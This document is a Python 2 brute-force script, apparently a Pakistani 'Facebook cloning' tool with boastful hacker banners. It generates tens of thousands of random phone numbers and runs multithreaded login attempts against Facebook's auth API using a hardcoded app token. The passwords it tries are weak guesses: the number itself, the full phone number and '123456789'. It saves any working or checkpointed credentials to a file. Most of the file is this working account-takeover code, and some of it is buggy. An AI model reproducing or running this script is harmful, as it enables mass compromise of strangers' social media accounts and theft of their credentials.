# Author Yunus#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(40000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 ABF2.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mWEAIT PLAESE \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

'########::'####::::'###::::'########:
 ##.... ##:. ##::::'## ##:::..... ##::
 ##:::: ##:: ##:::'##:. ##:::::: ##:::
 ########::: ##::'##:::. ##:::: ##::::
 ##.. ##:::: ##:: #########::: ##:::::
 ##::. ##::: ##:: ##.... ##:: ##::::::
 ##:::. ##:'####: ##:::: ##: ########:
..:::::..::....::..:::::..::........::
                   
                   

\033[1;93m              ꧁☠ℜ𝔦𝔞𝔷☠️꧂ :)) 
\033[1;95m••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;94m➣ \033[1;96mHATERX FEEL ON RAKHO MR ꧁☠ℜ𝔦𝔞𝔷☠️꧂ (^o^) ..
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;92m➣ \033[1;92mDEVOLPER   :            ꧁☠ℜ𝔦𝔞𝔷☠️꧂
\033[1;91m➣ \033[1;92mFACEBOOK   :            https://www.facebook.com/Riaz-hacker-100835532473815/
\033[1;93m➣ \033[1;92mWHATSAPP   :            +923188214452
\033[1;96m➣ \033[1;92mGITHUB     :                Riazkiller
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;92m➣ \033[1;96mNOTE IDS JUST NOW ON KARO ..
\033[1;97mNOTE MULTIPLE SEARCH PLY STORE WAHA SE ON KARO             
"""

####Logo####

logo1 = """


'########::'####::::'###::::'########:
 ##.... ##:. ##::::'## ##:::..... ##::
 ##:::: ##:: ##:::'##:. ##:::::: ##:::
 ########::: ##::'##:::. ##:::: ##::::
 ##.. ##:::: ##:: #########::: ##:::::
 ##::. ##::: ##:: ##.... ##:: ##::::::
 ##:::. ##:'####: ##:::: ##: ########:
..:::::..::....::..:::::..::........::　 
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;93m➣ \033[1;96m꧁☠ℜ𝔦𝔞𝔷☠️꧂ SISTIM FUCKER ..
\033[1;94m•••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;95m➣ DEVOLPER     :        ꧁☠ℜ𝔦𝔞𝔷☠️꧂
\033[1;96m➣ FACEBOOK     :https://www.facebook.com/Riaz-hacker-100835532473815/
\033[1;94m➣ GITHUB       :           Riazkiller
\033[1;97m➣ WHATAAPP     :        +923188214452
\033[1;92m•••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;93m➣ \033[1;96mYOU CAN COPY ME BUT YOU CAN'T BE ME..
\033[1;94m•••••••••••••••••••••••••••••••••••••••••••••••      
"""
logo2 = """
\033[1;91m꧁☠ℜ𝔦𝔞𝔷☠️꧂ KING OF BALOCHISTAN

'########::'####::::'###::::'########:
 ##.... ##:. ##::::'## ##:::..... ##::
 ##:::: ##:: ##:::'##:. ##:::::: ##:::
 ########::: ##::'##:::. ##:::: ##::::
 ##.. ##:::: ##:: #########::: ##:::::
 ##::. ##::: ##:: ##.... ##:: ##::::::
 ##:::. ##:'####: ##:::: ##: ########:
..:::::..::....::..:::::..::........::
                                           
                                           

\033[1;92m➣      FUCK YOUR SISTIM MARK ZUCKERBERG
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••   
\033[1;96m➣ \033[1;93mHATERZ FEEL ON KARLO ...
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••    
\033[1;91m➣ \033[1;92mAUTHOR    :   \033[1;97m꧁☠ℜ𝔦𝔞𝔷☠️꧂
\033[1;92m➣ \033[1;93mFACEBOOK  :   \033[1;97mhttps://www.facebook.com/Riaz-hacker-100835532473815/
\033[1;93m➣ \033[1;91mWHATSAPP  :   \033[1;97m+923188214452
\033[1;94m➣ \033[1;96mGITHUB    :   \033[1;97mRiazkiller
\033[1;96m➣ \033[1;92mLEGAND PLYEER       :   \033[1;97m꧁☠ℜ𝔦𝔞𝔷☠️꧂
\033[1;91m➣ \033[1;93mVERSION   :   \033[1;97m1.0.8
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91m➣ \033[1;93mCP IDS JUST NOW OPEN..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••     
"""
CorrectUsername = "riazkhan"
CorrectPassword = "riazkhan"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m➣ \x1b[1;93mTOOL USERNAME \x1b[1;97m»» \x1b[1;97m ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;92m➣ \x1b[1;93mTOOL PASSWORD \x1b[1;97m»» \x1b[1;97m ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:THE ZEEKO
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://wa.me/+923188214452')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://wa.me/+923188214452')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;93m[1] START "
    time.sleep(0.05)
    
    time.sleep(0.05)
    print '\x1b[1;91m[0] EXIT'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[1] START CLONING '
    time.sleep(0.10)
    print '\x1b[1;91m[0] Back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;93m➣ \033[1;97mCHOOSE: ')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "\033[1;94m➣ \033[1;93mEnter any Pakistan Mobile code Number"+'\n'
        print '\033[1;95m➣ \033[1;93mExample'
        print '\033[1;96m[+] Jazz    :  00 01 02 03 04 05 06 07 08 09   \033[1;92m[+] Zong    :  10 11 12 13 14 15 16 17 18      \033[1;92m[+] Warid   :  22 23 24 25                     \033[1;92m[+] Ufone   :  31 32 33 34 35 36 37 38         [+] Telenor :  40 41 42 43 44 45 46 47 48 49' 
        try:
            c = raw_input("\033[1;92m➣ \033[1;97mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan ('\033[1;94m[+] Total ids number: '+xxx)
    jalan ('\033[1;95m[+] Code you choose: '+c)
    jalan ("\033[1;96m[+] Wait A While Start Cracking...")
    jalan ("\033[1;95m[+] To Stop Process Press Ctrl+z")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/Checkpoint.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;96m[Checkpoint] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/Checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Successfull] ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/Checkpoint.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;96m[Checkpoint] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/Checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="123456789"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass3
                                okb = open('save/Checkpoint.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                               if 'www.facebook.com' in q['error_msg']:
                                   print '\033[1;96m[Checkpoint] ' + k + c + user + '  |  ' + pass3
                                   cps = open('save/Checkpoint.txt', 'a')
                                   cps.write(k+c+user+pass3+'\n')
                                   cps.close()
                                   cpb.append(c+user+pass3)
                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                          
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/Checkpoint')
    jalan("Note : Your Checkpoint Accounts Will Open after  12 days")
    print ''
    print """
    \033[1;92m.                                  _____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________
______¶¶¶¶¶¶¶¶¶___________¶¶¶¶¶¶¶¶¶_______
____¶¶¶¶¶__________¶¶¶¶¶__________¶¶¶¶¶___
____¶¶___________¶¶¶¶¶¶¶¶¶____________¶¶__
____¶¶__________¶¶¶¶¶¶¶¶¶¶¶___________¶¶__
____¶¶______________¶¶¶¶¶¶____________¶¶__
____¶¶_____________¶¶¶¶¶¶¶____________¶¶__
____¶¶______¶¶___¶¶¶¶¶¶¶¶¶____________¶¶__
____¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶_¶_____¶¶__
____¶¶_____¶¶¶¶¶¶¶¶¶¶¶________¶¶______¶¶__
____¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶_______¶¶¶_____¶¶__
____¶¶____¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_____¶¶_____¶¶__
____¶¶______¶¶____¶¶¶¶¶¶¶¶¶____¶¶_____¶¶__
____¶¶_______¶_____¶¶¶¶¶¶¶¶¶_¶¶¶______¶¶__
____¶¶_____________¶¶¶¶¶¶¶¶¶¶¶________¶¶__
____¶¶_____________¶¶¶¶¶¶¶_¶_________¶¶___
_____¶¶_______¶¶___¶¶¶¶¶¶¶__________¶¶____
______¶¶______¶¶¶¶¶¶¶¶¶¶¶__________¶¶_____
_______¶¶_____________¶¶¶_________¶¶______
________¶¶___________¶¶__________¶¶_______
_________¶¶_________¶¶__________¶¶________
__________¶¶______¶¶¶__________¶¶_________
___________¶¶¶_______________¶¶___________
_____________¶¶____________¶¶¶____________
_______________¶¶¶_______¶¶¶______________
_________________¶¶¶__¶¶¶_________________
____________________¶¶____________________


"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

